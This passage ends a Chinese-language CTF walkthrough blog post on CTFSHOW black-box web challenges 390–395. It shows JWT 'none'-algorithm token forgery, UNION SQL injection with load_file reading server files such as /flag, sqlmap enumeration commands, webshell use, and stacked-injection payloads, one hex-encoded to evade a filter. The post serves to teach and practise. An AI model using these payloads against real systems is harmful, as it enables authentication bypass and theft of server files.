class="string">&quot;none&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">jwt_token = jwt.encode(<span class="built_in">dict</span>, key=<span class="string">&#x27;&#x27;</span>,headers=headers, algorithm=<span class="string">&quot;none&quot;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(jwt_token)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到token后复制替换网页中的cookie，成功绕过限制</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727151019170.png"></p>
+<p>剩下的步骤跟web388一样，成功得到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727152558175.png"></p>
+<p><strong>方法二（数字型注入）：</strong></p>
+<p>在首页打开<strong>灯泡往事</strong>，发现有个id存在注入漏洞</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727151418862.png"></p>
+<p>输入单引号和双引号都没反应，经过测试，发现是数字型注入，输入<code>page.php?id=-1 union select 1,2,3#</code>，回显位置为2和3</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727151731833.png"></p>
+<p>接下来就是把<code>alsckdfy/check.php</code>的内容写到页面即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page.php?id=-1 union select 1,2,substr((select load_file(&#x27;/var/www/html/alsckdfy/check.php&#x27;)),1,255)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727152226300.png"></p>
+<p>然后查看网页源代码得到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727152303115.png"></p>
+<h3 id="web391"><a href="#web391" class="headerlink" title="web391"></a>web391</h3><p><strong>方法一（JWT伪造）：</strong></p>
+<p>上一题的解法依旧能用，跟之前一样，也是先绕过权限写入日志</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727153731737.png"></p>
+<p>然后利用webshell读取flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727153757690.png"></p>
+<p><strong>方法二（字符型注入）：</strong></p>
+<p>在首页打开<strong>灯泡往事</strong>，发现多了一个<strong>标题输入框</strong></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727154533090.png"></p>
+<p>经测试存在字符型注入，为单引号，且#被过滤，用<code>-- -</code>代替，回显位置为2和3</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727154642253.png"></p>
+<p>把<code>alsckdfy/check.php</code>的内容写到页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search.php?title=-1&#x27; union select 1,2,substr((select load_file(&#x27;/var/www/html/alsckdfy/check.php&#x27;)),1,255)-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727154921268.png"></p>
+<p>查看网页源码即可得到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727154944575.png"></p>
+<h3 id="web392"><a href="#web392" class="headerlink" title="web392"></a>web392</h3><p><strong>方法一（JWT伪造）：</strong></p>
+<p>跟web390方法一样，不过这次flag位置改变了，不在<code>alsckdfy/check.php</code>里面</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727155924268.png"></p>
+<p>而是在根目录<code>/flag</code>里面</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727155839329.png"></p>
+<p><strong>方法二（字符型注入）：</strong></p>
+<p>跟上题方法一样，不过要读取的文件改成了根目录<code>/flag</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search.php?title=-1&#x27; union select 1,2,substr((select load_file(&#x27;/flag&#x27;)),1,255)-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727160403388.png"></p>
+<h3 id="web393"><a href="#web393" class="headerlink" title="web393"></a>web393</h3><p><strong>方法一（JWT伪造）：</strong></p>
+<p>跟上题方法一样，flag也是在根目录</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727161002389.png"></p>
+<p><strong>方法二（堆叠注入）：</strong></p>
+<p>在首页最底下发现有个搜索引擎</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727163048703.png"></p>
+<p>点第一个百度，进去之后发现是百度的搜索页面</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727163228862.png"></p>
+<p>修改网页id值，又显示其他页面</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727163319794.png"></p>
+<p>因此可以判断这里存储的是网页链接，通过传入的id值查询数据库中的url并进行访问</p>
+<p>同时测试发现<code>/search.php?title=1</code>存在堆叠注入，需要先获取数据库的表名和列名再利用，用sqlmap</p>
+<p>获取数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://4a581051-6c96-4489-b2d2-f76b8662be96.challenge.ctf.show/search.php?title=1 --method=GET --dbs --batch</span><br></pre></td></tr></table></figure>
+
+<p>获取表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://4a581051-6c96-4489-b2d2-f76b8662be96.challenge.ctf.show/search.php?title=1 --method=GET -D ctfshow --tables --batch</span><br></pre></td></tr></table></figure>
+
+<p>获取列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://4a581051-6c96-4489-b2d2-f76b8662be96.challenge.ctf.show/search.php?title=1 --method=GET -D ctfshow -T link --columns --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727171403864.png"></p>
+<p>接着利用堆叠注入插入数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search.php?title=1&#x27;;insert into link(id, name, url) values(11,&#x27;a&#x27;,&#x27;file:///flag&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>最后访问<code>/link.php?id=11</code>即可</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727172346550.png"></p>
+<h3 id="web394"><a href="#web394" class="headerlink" title="web394"></a>web394</h3><p><strong>方法一（JWT伪造）：</strong></p>
+<p>跟web390方法一样，但是flag这次不在根目录<code>/flag</code>了，而是在网站目录的<code>alsckdfy/check.php</code>里面</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727183842499.png"></p>
+<p><strong>方法二（堆叠注入）：</strong></p>
+<p>跟上题方法一样，但是这次过滤了一些字符，用16进制绕过即可</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727184234096.png"></p>
+<p>记得在前面加个0x表示16进制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search.php?title=1&#x27;;insert into link(id, name, url)</span><br><span class="line">values(10,&#x27;a&#x27;,0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870);</span><br></pre></td></tr></table></figure>
+
+<p>最后访问<code>/link.php?id=10</code>即可</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727184632353.png"></p>
+<p>查看网页源代码</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727184653503.png"></p>
+<h3 id="web395"><a href="#web395" class="headerlink" title="web395"></a>web395</h3><p><strong>方法一（JWT伪造）：</strong></p>
+<p>解法跟上题一样</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727190828512.png"></p>
+<p><strong>方法二（堆叠注入）：</strong></p>
+<p>解法也是跟上题一样</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727190950137.png"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>NaecoYes：<a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/120639310">https://blog.csdn.net/q20010619/article/details/120639310</a></p>
+</div><div class="article-licensing box"><div class="licensing-title"><p>CTFSHOW | 黑盒测试 web380 - web395</p><p><a href="https://waynejoon.github.io/posts/ctfshow-black-box-web380-web395/">https://waynejoon.github.io/posts/ctfshow-black-box-web380-web395/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>WayneJoon.H</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2025-07-27</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/CTFSHOW/">CTFSHOW, </a><a class="link-muted" rel="tag" href="/tags/CTF%E7%BB%83%E4%B9%A0/">CTF练习 </a></div></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/ctfshow-xxe-web373-web378/"><span class="level-item">CTFSHOW | XXE题解 web373 - web378</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/waynejoon.jpg" alt="WayneJoon.H"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">WayneJoon.H</p><p class="is-size-6 is-block">记录学习生活</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives/"><p class="title">6</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories/"><p class="title">3</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags/"><p class="title">5</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/waynejoon" target="_blank" rel="me noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/waynejoon"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#什么是黑盒测试"><span class="level-left"><span class="level-item">1</span><span class="level-item">什么是黑盒测试</span></span></a></li><li><a class="level is-mobile" href="#黑盒测试一般思路"><span class="level-left"><span class="level-item">2</span><span class="level-item">黑盒测试一般思路</span></span></a></li><li><a class="level is-mobile" href="#题目列表"><span class="level-left"><span class="level-item">3</span><span class="level-item">题目列表</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#web380"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">web380</span></span></a></li><li><a class="level is-mobile" href="#web381"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">web381</span></span></a></li><li><a class="level is-mobile" href="#web382"><span class="level-left"><span class="level-item">3.3</span><span class="level-item">web382</span></span></a></li><li><a class="level is-mobile" href="#web383"><span class="level-left"><span class="level-item">3.4</span><span class="level-item">web383</span></span></a></li><li><a class="level is-mobile" href="#web384"><span class="level-left"><span class="level-item">3.5</span><span class="level-item">web384</span></span></a></li><li><a class="level is-mobile" href="#web385"><span class="level-left"><span class="level-item">3.6</span><span class="level-item">web385</span></span></a></li><li><a class="level is-mobile" href="#web386"><span class="level-left"><span class="level-item">3.7</span><span class="level-item">web386</span></span></a></li><li><a class="level is-mobile" href="#web387"><span class="level-left"><span class="level-item">3.8</span><span class="level-item">web387</span></span></a></li><li><a class="level is-mobile" href="#web388"><span class="level-left"><span class="level-item">3.9</span><span class="level-item">web388</span></span></a></li><li><a class="level is-mobile" href="#web389"><span class="level-left"><span class="level-item">3.10</span><span class="level-item">web389</span></span></a></li><li><a class="level is-mobile" href="#web390"><span class="level-left"><span class="level-item">3.11</span><span class="level-item">web390</span></span></a></li><li><a class="level is-mobile" href="#web391"><span class="level-left"><span class="level-item">3.12</span><span class="level-item">web391</span></span></a></li><li><a class="level is-mobile" href="#web392"><span class="level-left"><span class="level-item">3.13</span><span class="level-item">web392</span></span></a></li><li><a class="level is-mobile" href="#web393"><span class="level-left"><span class="level-item">3.14</span><span class="level-item">web393</span></span></a></li><li><a class="level is-mobile" href="#web394"><span class="level-left"><span class="level-item">3.15</span><span class="level-item">web394</span></span></a></li><li><a class="level is-mobile" href="#web395"><span class="level-left"><span class="level-item">3.16</span><span class="level-item">web395</span></span></a></li></ul></li><li><a class="level is-mobile" href="#参考"><span class="level-left"><span class="level-item">4</span><span class="level-item">参考</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">WayneJH</a><p class="is-size-7"><span>&copy; 2025 WayneJoon.H</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">共<span id="busuanzi_value_site_uv">0</span>个访客</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="GitHub" href="https://github.com/waynejoon"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script data-pjax src="/js/column.js"></script><script data-pjax src="/js/busuanzi-fix.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
